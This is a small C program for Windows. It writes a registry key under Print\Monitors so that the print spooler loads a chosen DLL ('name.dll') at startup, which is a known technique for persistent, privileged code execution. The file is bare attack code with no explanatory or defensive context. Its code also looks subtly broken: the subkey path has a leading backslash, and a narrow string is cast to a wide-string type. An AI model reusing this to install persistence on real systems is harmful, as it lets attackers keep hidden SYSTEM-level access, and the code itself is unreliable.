#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[])
{
	HKEY hKey = NULL;

	// Subkey
	const char* sk  = "\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow";
	const char* dll = "name.dll";

	// Startup
	long res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hKey, NULL);
	if (res == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, (LPCWSTR)"Driver", 0, REG_SZ, (unsigned char*)dll, strlen(dll));
		RegCloseKey(hKey);
	}
	else
	{
		printf("Failed to create new registry subkey :(");
		return -1;
	}
	return 0;
}